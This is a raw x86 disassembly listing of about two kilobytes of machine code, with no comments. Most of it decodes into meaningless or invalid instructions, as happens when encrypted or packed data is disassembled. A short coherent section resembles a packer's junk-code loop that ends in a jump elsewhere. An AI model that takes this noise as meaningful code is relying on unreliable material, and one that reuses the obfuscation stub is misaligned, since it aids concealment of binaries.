  4057a8:	cmp    esp,DWORD PTR [eax+0x42252c0]
  4057ae:	or     eax,0xceee2394
  4057b3:	mov    cl,0x2f
  4057b5:	and    al,0x4c
  4057b7:	jne    0x4057d6
  4057b9:	in     al,0xed
  4057bb:	push   ds
  4057bc:	adc    ecx,ebx
  4057be:	adc    ch,BYTE PTR [esi+edi*1-0x2d6dd3b7]
  4057c5:	ins    BYTE PTR es:[edi],dx
  4057c6:	stos   DWORD PTR es:[edi],eax
  4057c7:	xchg   ebx,eax
  4057c8:	scas   al,BYTE PTR es:[edi]
  4057c9:	pop    esp
  4057ca:	out    dx,eax
  4057cb:	mov    eax,0x89d0e82
  4057d0:	fiadd  WORD PTR [ebx]
  4057d2:	rcl    BYTE PTR [edi+0x1f],0xa
  4057d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057d7:	sub    al,0x7c
  4057d9:	stos   BYTE PTR es:[edi],al
  4057da:	aas    
  4057db:	adc    eax,0xf3fbb074
  4057e0:	cmp    bh,BYTE PTR [edx+eax*8+0x6a]
  4057e4:	mov    ds:0xa826d137,eax
  4057e9:	loopne 0x405800
  4057eb:	and    ax,0x12c4
  4057ef:	sub    dh,bh
  4057f1:	fadd   QWORD PTR [esi+0x18b7ebf3]
  4057f7:	xchg   ebx,eax
  4057f8:	out    0x8d,al
  4057fa:	jmp    0x27a2:0xbd52ec75
  405801:	xor    al,0x63
  405803:	mov    dh,0xf6
  405805:	cmp    BYTE PTR [edx+ebx*8+0x43ad6aa4],bl
  40580c:	pusha  
  40580d:	shr    al,0x6
  405810:	push   es
  405811:	dec    BYTE PTR [edi+0x4e2dd1ea]
  405817:	stos   BYTE PTR es:[edi],al
  405818:	retf   0xbf02
  40581b:	nop
  40581c:	dec    edi
  40581d:	gs or  al,0xb8
  405820:	sub    BYTE PTR [ebp-0x3bd446d],0x77
  405827:	add    ebx,esi
  405829:	xor    esi,DWORD PTR [ebx]
  40582b:	hlt    
  40582c:	and    al,ah
  40582e:	inc    ebx
  40582f:	ror    ch,1
  405831:	mov    al,ds:0x47b0c188
  405836:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405837:	or     ebx,DWORD PTR [edi]
  405839:	and    al,ah
  40583b:	sbb    BYTE PTR [esi],bl
  40583d:	fwait
  40583e:	or     al,0xe4
  405840:	xchg   edi,eax
  405841:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405842:	das    
  405843:	popf   
  405844:	inc    esp
  405845:	pop    es
  405846:	jmp    0x7fa3dbea
  40584b:	mov    ebp,0xfd11efb7
  405850:	inc    ebp
  405851:	fistp  QWORD PTR [ebp+0x23]
  405854:	aad    0x7c
  405856:	into   
  405857:	jmp    0x9bcd8e27
  40585c:	inc    ebx
  40585d:	or     DWORD PTR [ecx],edx
  40585f:	loopne 0x4057fc
  405861:	aaa    
  405862:	push   ds
  405863:	jle    0x4057f5
  405865:	mov    cl,0x9e
  405867:	jmp    0x4058cd
  405869:	mov    esp,0xd1a44609
  40586e:	and    esi,esp
  405870:	in     eax,dx
  405871:	jl     0x40583e
  405873:	ret    
  405874:	inc    esp
  405875:	xchg   edx,eax
  405876:	retf   0xcfb8
  405879:	fmul   DWORD PTR [edx-0x21]
  40587c:	into   
  40587d:	pop    ss
  40587e:	rcr    bh,cl
  405880:	xor    edi,eax
  405882:	sahf   
  405883:	push   eax
  405884:	out    dx,al
  405885:	jl     0x4058c3
  405887:	sbb    eax,0x713edd4a
  40588c:	mov    al,0xd6
  40588e:	leave  
  40588f:	outs   dx,DWORD PTR ds:[esi]
  405890:	bound  edx,QWORD PTR [ebx+0x5]
  405893:	retf   0x7452
  405896:	mov    WORD PTR [ecx],es
  405898:	xor    DWORD PTR [ebp-0x37ff279d],0x40
  40589f:	adc    eax,0x207d3995
  4058a4:	pop    esi
  4058a5:	std    
  4058a6:	sub    bh,BYTE PTR [edi]
  4058a8:	xor    DWORD PTR [ebx-0x696dafff],esp
  4058ae:	mov    DWORD PTR [ebx-0x50],ecx
  4058b1:	(bad)  
  4058b2:	jns    0x405866
  4058b4:	int    0xc5
  4058b6:	cdq    
  4058b7:	mov    cl,0xb7
  4058b9:	leave  
  4058ba:	jae    0x4058a0
  4058bc:	shl    DWORD PTR [esi+0xd],0xb6
  4058c0:	pop    ebp
  4058c1:	mov    ds:0xbcdae4e9,al
  4058c6:	inc    edx
  4058c7:	pop    DWORD PTR [esi-0x23]
  4058ca:	(bad)  
  4058cb:	mov    esi,0x6f33fe28
  4058d0:	fadd   st(6),st
  4058d2:	jne    0x4058bc
  4058d4:	lods   al,BYTE PTR ds:[esi]
  4058d5:	mov    edi,DWORD PTR [ecx]
  4058d7:	mov    eax,ds:0xe4c80c89
  4058dc:	leave  
  4058dd:	call   0xbaa8:0xd46e9c86
  4058e4:	mov    eax,DWORD PTR ds:0x7fb8e99c
  4058ea:	sbb    BYTE PTR [esi+ebp*2-0x3e],dh
  4058ee:	pop    ds
  4058ef:	push   es
  4058f0:	test   BYTE PTR [esi+0x4b39dc6f],0xb4
  4058f7:	xor    eax,0xcfb80500
  4058fc:	data16 mul cl
  4058ff:	cwde   
  405900:	mov    dl,0xb7
  405902:	or     DWORD PTR [eax+0x3b],ebx
  405905:	mov    ds:0xfa74b711,eax
  40590a:	ja     0x40595c
  40590c:	mov    edx,0xc60f0bb1
  405911:	mov    ds:0x2d6e92ac,eax
  405916:	jbe    0x405997
  405918:	cmp    BYTE PTR [eax+0x74f180d8],0xa6
  40591f:	jae    0x405944
  405921:	pop    esi
  405922:	je     0x405926
  405924:	inc    ebp
  405925:	mov    cl,0xc
  405927:	imul   eax,ebp,0x3d32d0e5
  40592d:	addr16 aaa 
  40592f:	sub    BYTE PTR [ebx+0x3b6dd651],0x52
  405936:	test   eax,0x7176217e
  40593b:	ja     0x40595c
  40593d:	(bad)  
  40593e:	jbe    0x405967
  405940:	mov    ds:0x232b1ea8,al
  405945:	cld    
  405946:	pop    ebp
  405947:	jmp    0xe154:0x6de5da70
  40594e:	mov    esi,DWORD PTR [ebp+0x648b35c1]
  405954:	es pop ebp
  405956:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405957:	icebp  
  405958:	jno    0x40590c
  40595a:	hlt    
  40595b:	in     eax,dx
  40595c:	aad    0x3f
  40595e:	inc    esi
  40595f:	lds    ebx,FWORD PTR ds:0x6957ac44
  405965:	and    DWORD PTR [esi+0x5515667b],esp
  40596b:	in     al,dx
  40596c:	jo     0x4059db
  40596e:	push   DWORD PTR [esi-0x45]
  405971:	pop    es
  405972:	add    edx,DWORD PTR ds:0x69754268
  405978:	mov    ecx,0xcb16407e
  40597d:	sub    eax,0x4039814
  405982:	adc    eax,DWORD PTR ds:0x3d2bec91
  405988:	push   ecx
  405989:	in     eax,dx
  40598a:	push   ds
  40598b:	mov    ecx,0xe4b5e47c
  405990:	ds aas 
  405992:	in     eax,dx
  405993:	dec    ebx
  405994:	add    ch,BYTE PTR [edx-0x1a805f92]
  40599a:	cdq    
  40599b:	and    DWORD PTR [eax-0x3c],0x861affb4
  4059a2:	cdq    
  4059a3:	test   al,0x68
  4059a5:	pop    edi
  4059a6:	and    al,0x7a
  4059a8:	jae    0x4059ef
  4059aa:	lds    esi,FWORD PTR [edi-0x5]
  4059ad:	in     al,dx
  4059ae:	inc    eax
  4059af:	adc    al,0x83
  4059b1:	push   edi
  4059b2:	mov    al,0xb2
  4059b4:	icebp  
  4059b5:	xor    BYTE PTR [esi],0xa
  4059b8:	mov    eax,0x4d94ffb2
  4059bd:	les    edi,FWORD PTR [ebx+0x36c54675]
  4059c3:	pusha  
  4059c4:	and    al,0xb8
  4059c6:	or     al,bh
  4059c8:	or     edx,DWORD PTR [ecx-0x49]
  4059cb:	aam    0x91
  4059cd:	js     0x40598e
  4059cf:	lods   al,BYTE PTR ds:[esi]
  4059d0:	jmp    0xa3c0:0x6932234b
  4059d7:	or     al,0x2
  4059d9:	test   al,0xb8
  4059db:	sub    ebx,DWORD PTR [edi+0x36]
  4059de:	cmp    al,0xa7
  4059e0:	xchg   DWORD PTR [ebx+0x1f0d284b],eax
  4059e6:	ret    0x2999
  4059e9:	and    al,0x49
  4059eb:	add    cl,bl
  4059ed:	test   eax,0xe309d677
  4059f2:	push   edi
  4059f3:	outs   dx,DWORD PTR ds:[esi]
  4059f4:	mov    bh,0x7c
  4059f6:	mov    ch,0x37
  4059f8:	add    cl,BYTE PTR [ebx]
  4059fa:	push   esp
  4059fb:	out    0xe3,al
  4059fd:	sub    ecx,DWORD PTR [eax+0x64250ec9]
  405a03:	lea    ebx,[ebx]
  405a05:	jmp    0x1cd65842
  405a0a:	adc    eax,0x3f9bbe00
  405a0f:	adc    esi,DWORD PTR gs:[edx-0x69]
  405a13:	pusha  
  405a14:	dec    eax
  405a15:	adc    BYTE PTR [ebp-0x34],bl
  405a18:	jg     0x405a13
  405a1a:	jb     0x4059cd
  405a1c:	mov    eax,0xcf06ebc5
  405a21:	xor    al,bh
  405a23:	iret   
  405a24:	sbb    bh,BYTE PTR [edi+0x2934dc24]
  405a2a:	(bad)  
  405a2b:	div    BYTE PTR [eax-0x2b]
  405a2e:	cmp    al,0xb4
  405a30:	test   bh,bh
  405a32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a33:	sub    ecx,DWORD PTR [eax]
  405a35:	or     eax,DWORD PTR [edi+0x71]
  405a38:	or     edi,edx
  405a3a:	adc    BYTE PTR [edi+0x3ff3e37c],dl
  405a40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a41:	xchg   esi,eax
  405a42:	inc    esp
  405a43:	mov    eax,ds:0xc243819
  405a48:	mov    DWORD PTR [eax+0x44aa0cde],0xb182ef5
  405a52:	add    esi,edi
  405a54:	lock mov edx,esp
  405a57:	push   ebx
  405a58:	push   0xbf2d596a
  405a5d:	cmp    eax,0x81151899
  405a62:	jnp    0x405a39
  405a64:	mov    ebx,0x95aa4709
  405a69:	cmp    edi,DWORD PTR [edx]
  405a6b:	sbb    DWORD PTR [ebp+0x27609cdd],esp
  405a71:	cdq    
  405a72:	cmp    eax,DWORD PTR [eax+0x51]
  405a75:	pop    ebp
  405a76:	fwait
  405a77:	push   es
  405a78:	pop    ebx
  405a79:	push   ebx
  405a7a:	xchg   BYTE PTR ds:0x8f2d7a0a,bh
  405a80:	leave  
  405a81:	mov    WORD PTR [esi+ebx*8],ds
  405a84:	xor    ebx,esp
  405a86:	mov    al,0x3a
  405a88:	retf   
  405a89:	repz std 
  405a8b:	fs jg  0x405a2b
  405a8e:	dec    esi
  405a8f:	jo     0x405adf
  405a91:	add    BYTE PTR [esi],cl
  405a93:	lock push edi
  405a95:	add    eax,0x6f57585c
  405a9a:	sbb    BYTE PTR [edi],0x33
  405a9d:	ja     0x405b09
  405a9f:	dec    ebx
  405aa0:	lock stc 
  405aa2:	dec    ebx
  405aa3:	or     dh,ch
  405aa5:	(bad)  [edi]
  405aa7:	xor    ah,cl
  405aa9:	or     ebp,ebx
  405aab:	push   ebp
  405aac:	nop
  405aad:	je     0x405a93
  405aaf:	arpl   WORD PTR ds:0x1fb6c9d0,si
  405ab5:	dec    edi
  405ab6:	test   eax,0xcba7f37a
  405abb:	xchg   esi,eax
  405abc:	in     al,0xf4
  405abe:	call   0x63a3:0xa68e3e3a
  405ac5:	add    DWORD PTR [eax],edx
  405ac7:	fnstsw WORD PTR [esi-0x28ad37c0]
  405acd:	pop    edi
  405ace:	xor    dh,ah
  405ad0:	dec    eax
  405ad1:	out    dx,eax
  405ad2:	pop    esi
  405ad3:	(bad)  
  405ad4:	enter  0x9d4,0xe0
  405ad8:	int3   
  405ad9:	icebp  
  405ada:	clc    
  405adb:	arpl   WORD PTR [edi-0x24b1b6f7],sp
  405ae1:	lahf   
  405ae2:	dec    esp
  405ae3:	jge    0x405b44
  405ae5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405ae6:	aam    0x51
  405ae8:	adc    al,0xd1
  405aea:	gs sub cl,dl
  405aed:	xor    al,0x95
  405aef:	ins    BYTE PTR es:[edi],dx
  405af0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405af1:	popa   
  405af2:	xchg   esp,eax
  405af3:	mov    ebp,0xba76c4d4
  405af8:	dec    esi
  405af9:	retf   0xe9c3
  405afc:	icebp  
  405afd:	shr    DWORD PTR [ebx-0x40c5ad23],0xa7
  405b04:	test   eax,0x1239e874
  405b09:	adc    dl,dh
  405b0b:	call   0x9b4779
  405b10:	push   edi
  405b11:	out    dx,eax
  405b12:	nop
  405b13:	jno    0x405aca
  405b15:	adc    edx,eax
  405b17:	jecxz  0x405af3
  405b19:	pop    esp
  405b1a:	adc    eax,DWORD PTR [edx-0x5b]
  405b1d:	pop    ebp
  405b1e:	cmp    dl,dl
  405b20:	inc    eax
  405b21:	sub    esi,DWORD PTR [edi-0x601b9865]
  405b27:	xchg   esp,eax
  405b28:	pop    ebx
  405b29:	adc    BYTE PTR [ebp+0x34],0x18
  405b2d:	shl    DWORD PTR es:[ebp+0x22],1
  405b31:	scas   al,BYTE PTR es:[edi]
  405b32:	fiadd  WORD PTR [eax-0x32]
  405b35:	das    
  405b36:	cmp    BYTE PTR [ebx+0x2d81f04d],cl
  405b3c:	data16 mov ds:0xa2e20042,al
  405b42:	inc    edx
  405b43:	add    BYTE PTR [ebx],dh
  405b45:	mov    BYTE PTR [ecx+0x42a2ea05],0x0
  405b4c:	cmp    BYTE PTR [ecx],al
  405b4e:	add    BYTE PTR [eax],al
  405b50:	xor    ecx,esi
  405b52:	lea    ecx,[eax+ecx*1+0x64e5e2]
  405b59:	and    DWORD PTR ds:0x42a26a,0x0
  405b63:	xor    eax,eax
  405b65:	or     eax,DWORD PTR ds:0x42a26a
  405b6b:	inc    eax
  405b6c:	mov    ds:0x42a26a,eax
  405b71:	cmp    DWORD PTR ds:0x42a26a,0x7
  405b78:	jge    0x405bae
  405b7e:	jmp    0x405b89
  405b83:	call   DWORD PTR ds:0x42a3da
  405b89:	cmp    DWORD PTR ds:0x42a26a,0x6
  405b90:	jne    0x405ba1
  405b96:	mov    eax,ds:0x42a26a
  405b9b:	inc    eax
  405b9c:	mov    ds:0x42a26a,eax
  405ba1:	cmp    DWORD PTR ds:0x42a26a,0x11
  405ba8:	jb     0x405b63
  405bae:	mov    eax,DWORD PTR [ebp-0xc]
  405bb1:	sbb    DWORD PTR ds:0x42a2c6,0x42a2f6
  405bbb:	xor    edx,edx
  405bbd:	or     DWORD PTR ds:0x42a29e,0x16dc
  405bc7:	div    ecx
  405bc9:	or     eax,ecx
  405bcb:	mov    eax,DWORD PTR [ebp-0x8]
  405bce:	xor    ecx,ecx
  405bd0:	xor    ecx,DWORD PTR ds:0x42a292
  405bd6:	sbb    DWORD PTR ds:0x42a2fa,ecx
  405bdc:	mov    ecx,DWORD PTR [ebp-0x10]
  405bdf:	xor    eax,esi
  405be1:	or     DWORD PTR ds:0x42a2c2,0x42a29a
  405beb:	xor    ecx,esi
  405bed:	sbb    DWORD PTR ds:0x42a2be,0x52cd
  405bf7:	sub    eax,ecx
  405bf9:	cmp    edx,eax
  405bfb:	jmp    0x407f54
  405c00:	mov    esp,0x8265841a
  405c05:	loope  0x405ba5
  405c07:	add    BYTE PTR [eax+0x74],0x97
  405c0b:	es mov ebx,0xb235239
  405c11:	cmp    DWORD PTR [ebx-0x7ca1b87d],eax
  405c17:	xor    ecx,0x58
  405c1a:	in     al,0x4c
  405c1c:	outs   dx,DWORD PTR ds:[esi]
  405c1d:	lds    ebx,FWORD PTR [esi-0x1f]
  405c20:	mov    esp,esp
  405c22:	test   al,0xaa
  405c24:	aad    0x20
  405c26:	mov    esi,0x264ce008
  405c2b:	mov    bh,0x61
  405c2d:	jge    0x405ca8
  405c2f:	mov    cl,0xbe
  405c31:	ret    0x8b3f
  405c34:	dec    eax
  405c35:	outs   dx,BYTE PTR ds:[esi]
  405c36:	pop    edi
  405c37:	es jle 0x405bf1
  405c3a:	ret    0xbab3
  405c3d:	fldcw  WORD PTR [ebx]
  405c3f:	dec    esp
  405c40:	mov    ah,0x93
  405c42:	mov    al,0xf4
  405c44:	pop    eax
  405c45:	gs (bad) 
  405c47:	dec    ebx
  405c48:	and    eax,0xcb421536
  405c4d:	pop    ebp
  405c4e:	clc    
  405c4f:	cwde   
  405c50:	xchg   ecx,eax
  405c51:	nop
  405c52:	test   DWORD PTR [ecx+0xe],edx
  405c55:	pushf  
  405c56:	retf   0x7769
  405c59:	mov    ah,0x12
  405c5b:	ins    BYTE PTR es:[edi],dx
  405c5c:	mov    dh,0x3a
  405c5e:	iret   
  405c5f:	ins    BYTE PTR es:[edi],dx
  405c60:	dec    esp
  405c61:	inc    edi
  405c62:	mov    eax,ds:0xd24a8cbc
  405c67:	xor    ah,dh
  405c69:	push   edx
  405c6a:	sub    BYTE PTR [eax-0x3610a739],0xee
  405c71:	aas    
  405c72:	in     al,dx
  405c73:	mov    eax,0xce387e66
  405c78:	push   ecx
  405c79:	clc    
  405c7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c7b:	out    0x8a,al
  405c7d:	push   ds
  405c7e:	push   esp
  405c7f:	and    BYTE PTR [eax+0x13],bl
  405c82:	or     BYTE PTR [ecx+0x13],0xb5
  405c86:	inc    esp
  405c87:	dec    eax
  405c88:	ins    BYTE PTR es:[edi],dx
  405c89:	hlt    
  405c8a:	xor    dh,BYTE PTR [esi]
  405c8c:	lods   al,BYTE PTR ds:[esi]
  405c8d:	mov    edx,0xa170e4d0
  405c92:	rcr    BYTE PTR [edx+0x42d18e42],cl
  405c98:	xlat   BYTE PTR ds:[ebx]
  405c99:	push   ebp
  405c9a:	mov    edi,0x6c2a1034
  405c9f:	jge    0x405cba
  405ca1:	into   
  405ca2:	jge    0x405d05
  405ca4:	stc    
  405ca5:	int3   
  405ca6:	inc    edi
  405ca7:	in     al,dx
  405ca8:	adc    BYTE PTR [edi],0xc0
  405cab:	inc    ebx
  405cac:	mov    bl,0xd8
  405cae:	pop    ss
  405caf:	sub    dl,ah
  405cb1:	clc    
  405cb2:	xchg   ebp,eax
  405cb3:	xchg   ebp,eax
  405cb4:	jbe    0x405c72
  405cb6:	fsubr  DWORD PTR [edx]
  405cb8:	(bad)  [ebx+ebx*4-0x7b]
  405cbc:	data16 cs mov ch,0x80
  405cc0:	enter  0xcfce,0xe8
  405cc4:	out    dx,al
  405cc5:	fucomip st,st(1)
  405cc7:	into   
  405cc8:	retfw  
  405cca:	pusha  
  405ccb:	adc    DWORD PTR [ebx+0x12],0xffffff8d
  405ccf:	lods   al,BYTE PTR ds:[esi]
  405cd0:	hlt    
  405cd1:	sbb    al,dl
  405cd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cd4:	push   cs
  405cd5:	pushf  
  405cd6:	pop    ebp
  405cd7:	pusha  
  405cd8:	mov    eax,ds:0xdf6e5fc0
  405cdd:	and    DWORD PTR [esi-0x20bad2e2],0x30
  405ce4:	mov    ds:0x31022eb,al
  405ce9:	ins    BYTE PTR es:[edi],dx
  405cea:	pop    eax
  405ceb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cec:	push   es
  405ced:	cld    
  405cee:	pop    ds
  405cef:	ret    0x7d90
  405cf2:	xor    DWORD PTR [ebx],0x1
  405cf5:	fsub   QWORD PTR [esi+ebp*4-0x3770beb9]
  405cfc:	or     al,cl
  405cfe:	push   ebp
  405cff:	mov    ds,WORD PTR [esi-0x55]
  405d02:	and    ah,ah
  405d04:	jno    0x405ce5
  405d06:	xchg   ebp,eax
  405d07:	adc    BYTE PTR ds:0x81d3d4ef,al
  405d0d:	das    
  405d0e:	(bad)  
  405d0f:	pop    esp
  405d10:	in     eax,dx
  405d11:	ins    DWORD PTR es:[edi],dx
  405d12:	cmp    dh,bh
  405d14:	and    esp,DWORD PTR [esi+0x59]
  405d17:	aas    
  405d18:	lahf   
  405d19:	das    
  405d1a:	push   ss
  405d1b:	mov    bh,0x6d
  405d1d:	outs   dx,DWORD PTR ds:[esi]
  405d1e:	daa    
  405d1f:	inc    ebp
  405d20:	mov    ebp,0xab258181
  405d25:	rcl    DWORD PTR [eax-0x45ded8ec],1
  405d2b:	cmp    DWORD PTR ds:[esi+ebp*4],eax
  405d2f:	jnp    0x405d01
  405d31:	in     eax,dx
  405d32:	jae    0x405d7a
  405d34:	xor    bl,BYTE PTR [esi+0x2a]
  405d37:	out    0x8a,al
  405d39:	dec    ebp
  405d3a:	addr16 dec ebp
  405d3c:	rcl    BYTE PTR es:[esi-0x4b8f303e],1
  405d43:	xor    esi,ebx
  405d45:	mov    bh,0xe2
  405d47:	(bad)  
  405d48:	xchg   ebp,eax
  405d49:	cwde   
  405d4a:	cmp    al,0xbe
  405d4c:	cld    
  405d4d:	dec    ebx
  405d4e:	hlt    
  405d4f:	xor    al,0x0
  405d51:	aaa    
  405d52:	mov    ecx,0x7acefa34
  405d57:	(bad)  
  405d58:	das    
  405d59:	dec    ecx
  405d5a:	sbb    DWORD PTR gs:[ebx-0xf771fa0],0xc7853155
  405d65:	sbb    eax,0xe0f6401a
  405d6a:	add    bl,BYTE PTR [eax*2-0x4468ae8a]
  405d71:	jge    0x405d28
  405d73:	xor    DWORD PTR [edx-0x80],edi
  405d76:	xchg   ebp,eax
  405d77:	jmp    0xfa53df1
  405d7c:	xlat   BYTE PTR ds:[ebx]
  405d7d:	jmp    0x17c4cb98
  405d82:	inc    edx
  405d83:	dec    esi
  405d84:	xchg   edx,eax
  405d85:	(bad)  
  405d86:	out    dx,al
  405d87:	inc    edi
  405d88:	adc    ebp,DWORD PTR [ebx+0x243494e6]
  405d8e:	sbb    cl,BYTE PTR [esi-0x4ba347da]
  405d94:	sbb    DWORD PTR [esi],eax
  405d96:	popf   
  405d97:	test   esi,ebx
  405d99:	pop    esi
  405d9a:	mov    al,ds:0xfb876834
  405d9f:	das    
  405da0:	jne    0xb4bf6829
  405da6:	xchg   ebx,eax
  405da7:	clc    
  405da8:	inc    edi
  405da9:	aad    0x69
  405dab:	fiadd  DWORD PTR [ecx]
  405dad:	xchg   ebp,eax
  405dae:	clc    
  405daf:	mov    al,ds:0x76c3c20d
  405db4:	inc    ebx
  405db5:	repnz fsubr st(5),st
  405db8:	pop    edi
  405db9:	adc    esp,DWORD PTR [edx-0x56c13c36]
  405dbf:	test   eax,0xd8410b38
  405dc4:	fcmovbe st,st(4)
  405dc6:	test   DWORD PTR [edx+ebp*2-0x7651e1ea],ebx
  405dcd:	sti    
  405dce:	add    eax,0xadff8fb1
  405dd3:	retf   0xf551
  405dd6:	cmp    ah,ch
  405dd8:	js     0x405e3d
  405dda:	push   0xb8764772
  405ddf:	sbb    ebp,esi
  405de1:	mov    WORD PTR [esi+edi*8+0x50],es
  405de5:	mov    ch,0x49
  405de7:	hlt    
  405de8:	aad    0x6f
  405dea:	out    dx,eax
  405deb:	push   cs
  405dec:	sti    
  405ded:	repz add ch,BYTE PTR [edx-0xc]
  405df1:	mov    al,ds:0x9b55d593
  405df6:	inc    edx
  405df7:	gs cdq 
  405df9:	mov    eax,0x592e9b88
  405dfe:	ds mov ecx,0xf409a888
  405e04:	or     DWORD PTR [ecx],ebp
  405e06:	adc    cl,BYTE PTR [ebp+0x2b]
  405e09:	push   0x38dbfef0
  405e0e:	pop    ss
  405e0f:	pop    esi
  405e10:	jno    0x405e90
  405e12:	call   0xb364:0xfadabd86
  405e19:	pop    edi
  405e1a:	(bad)  
  405e1b:	jmp    0xa7474a1
  405e20:	xchg   ebp,eax
  405e21:	icebp  
  405e22:	add    bh,BYTE PTR [ebx]
  405e24:	fnstcw WORD PTR [esi]
  405e26:	dec    ebp
  405e27:	push   ecx
  405e28:	fs push edi
  405e2a:	out    dx,eax
  405e2b:	fstp   DWORD PTR [ebx+0x567c7f4c]
  405e31:	retf   0x5078
  405e34:	std    
  405e35:	into   
  405e36:	inc    ebp
  405e37:	cmp    ch,BYTE PTR [eax+0x6d]
  405e3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e3b:	jl     0x405de1
  405e3d:	xchg   esi,eax
  405e3e:	and    ebx,DWORD PTR [esi]
  405e40:	cmp    ebp,DWORD PTR [eax+0x258249db]
  405e46:	pop    es
  405e47:	rol    BYTE PTR [edx+0x4103994],0x53
  405e4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e4f:	dec    eax
  405e50:	or     ch,BYTE PTR ds:0xf7b1c370
  405e56:	in     eax,0x69
  405e58:	mov    esp,0x9c542465
  405e5d:	nop
  405e5e:	and    al,0x87
  405e60:	popf   
  405e61:	sub    al,0xc6
  405e63:	dec    dl
  405e65:	xchg   esp,eax
  405e66:	inc    ecx
  405e67:	mov    dl,0x75
  405e69:	test   BYTE PTR [ebp-0x5d2577e0],0x6e
  405e70:	xchg   ecx,eax
  405e71:	out    dx,eax
  405e72:	mov    ds:0x352aec33,al
  405e77:	aam    0xfa
  405e79:	push   ebp
  405e7a:	imul   esp,esp,0x6d
  405e7d:	jno    0x405ef7
  405e7f:	xchg   cl,ah
  405e81:	push   edx
  405e82:	lds    ecx,FWORD PTR [ebx+0x5b]
  405e85:	mov    ds:0xbf06191f,eax
  405e8a:	dec    esi
  405e8b:	mov    eax,0xf2133755
  405e90:	test   al,0xff
  405e92:	out    0x7b,al
  405e94:	stos   DWORD PTR es:[edi],eax
  405e95:	add    al,0xfe
  405e97:	add    BYTE PTR [edi-0x5f],al
  405e9a:	sbb    al,0x8e
  405e9c:	push   0xffffffe1
  405e9e:	add    esp,DWORD PTR [ebx-0x290c5af4]
  405ea4:	iret   
  405ea5:	aaa    
  405ea6:	aam    0xec
  405ea8:	loop   0x405e75
  405eaa:	(bad)  [esi]
  405eac:	dec    esi
  405ead:	int    0xf7
  405eaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405eb0:	jno    0x405f08
  405eb2:	cmp    BYTE PTR [eax-0x63],0x3e
  405eb6:	mov    BYTE PTR [esi+0x3ef4a0da],al
  405ebc:	(bad)  
  405ebd:	mov    dl,0x70
  405ebf:	jns    0x405eb5
  405ec1:	pop    edx
  405ec2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ec3:	xchg   esi,eax
  405ec4:	iret   
  405ec5:	xor    esp,DWORD PTR [edi]
  405ec7:	addr16 push edi
  405ec9:	sahf   
  405eca:	or     eax,0xc213ba01
  405ecf:	push   ds
  405ed0:	sbb    BYTE PTR [eax+0x21],bh
  405ed3:	shl    DWORD PTR [esi-0x78],0x2a
  405ed7:	hlt    
  405ed8:	mov    cs,WORD PTR [ecx]
  405eda:	add    eax,0x75d91f46
  405edf:	jo     0x405e73
  405ee1:	outs   dx,DWORD PTR ds:[esi]
  405ee2:	mov    BYTE PTR [edi],bh
  405ee4:	test   eax,0x84510d7b
  405ee9:	pop    esi
  405eea:	inc    esp
  405eeb:	mov    ecx,0x70039827
  405ef0:	mov    ch,0x4
  405ef2:	jmp    0x59fce1a
  405ef7:	push   ebx
  405ef8:	sbb    cl,BYTE PTR [eax]
  405efa:	xor    al,BYTE PTR [edi+0x3f415b9b]
  405f00:	(bad)  
  405f01:	pop    ss
  405f02:	out    dx,al
  405f03:	mov    DWORD PTR [esi+0x7a],esi
  405f06:	lahf   
  405f07:	fsubr  QWORD PTR [ebx]
  405f09:	imul   ebx,DWORD PTR [eax],0x53
  405f0c:	(bad)  
  405f0d:	(bad)  
  405f0e:	aaa    
  405f0f:	pop    edx
  405f10:	and    esp,eax
  405f12:	xchg   edx,eax
  405f13:	or     eax,0xcc6b37fb
  405f18:	mov    eax,0xecbefce
  405f1d:	test   DWORD PTR [ecx+0x7c],ebp
  405f20:	dec    ebp
  405f21:	mov    edx,0xb553c754
  405f26:	dec    ebp
  405f27:	retf   
  405f28:	dec    eax
  405f29:	aad    0xab
  405f2b:	adc    al,0x7a
  405f2d:	bound  ecx,QWORD PTR [ecx+0x2cb9168e]
  405f33:	sbb    al,dl
  405f35:	lods   al,BYTE PTR ds:[esi]
  405f36:	ss xchg edi,eax
  405f38:	das    
  405f39:	lods   eax,DWORD PTR ds:[esi]
  405f3a:	mov    DWORD PTR [esi+0x1b],esi
  405f3d:	push   ecx
  405f3e:	adc    al,0xed
  405f40:	sar    BYTE PTR [eax],1
  405f42:	test   ah,cl
  405f44:	out    0x40,eax
  405f46:	add    dl,BYTE PTR [edx]
  405f48:	jle    0x405fc4
  405f4a:	ds aam 0x76
  405f4d:	les    ecx,FWORD PTR [eax-0xd]
  405f50:	(bad)  
  405f53:	xchg   esi,eax
  405f54:	xor    eax,0x7e1ece52
  405f59:	ja     0x405f13
  405f5b:	or     eax,DWORD PTR [edx-0x68]
  405f5e:	inc    ecx
  405f5f:	cwde   
  405f60:	sub    esi,eax
  405f62:	mov    eax,0x32bd7719
  405f67:	jno    0x405f6e
  405f69:	popf   
  405f6a:	out    0x8f,eax
  405f6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f6d:	jae    0x405fed
  405f6f:	retf   
  405f70:	sub    DWORD PTR [ebx],0x56be94b3
  405f76:	pmaddwd mm0,QWORD PTR [edx-0x59]
  405f7a:	mov    ch,0xc9
  405f7c:	(bad)  
  405f7d:	xor    BYTE PTR [ebx],ah
  405f7f:	mov    eax,0xb28f135f
  405f84:	cmc    
  405f85:	das    
  405f86:	ins    BYTE PTR es:[edi],dx
  405f87:	out    dx,eax
  405f88:	jbe    0x405f53
  405f8a:	lods   eax,DWORD PTR ds:[esi]
  405f8b:	and    bh,0xd6
  405f8e:	shr    ebx,cl
  405f90:	gs ins BYTE PTR es:[edi],dx
  405f92:	add    al,0x72
